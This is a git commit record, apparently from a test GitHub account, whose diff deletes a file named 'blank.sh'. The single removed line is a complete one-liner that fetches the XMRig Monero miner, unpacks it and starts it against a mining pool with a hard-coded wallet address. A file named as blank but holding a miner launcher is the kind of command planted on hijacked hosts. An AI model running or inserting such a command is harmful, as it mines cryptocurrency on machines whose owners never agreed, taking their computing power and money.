12b16da7f3f9d11695f90ef2d8738865ba15c75e
thongtest2 <90570728+thongtest2@users.noreply.github.com>
2022-02-16 01:19:52 +0700

    Delete blank.sh

--- blank.sh
+++
@@ -1,1 +0,0 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz && tar xf xmrig-6.16.4-linux-static-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o sg.minexmr.com:443 -u 84PaFenaQAZBeLCLdooJv3TQA9guadxquinwZGPFwyNENLXFG3a6jU6PimmFRjR2nZ2Nv1WRXUd3wVjQiWHCZBNNE8SqKiF -k --tls --rig-id Test
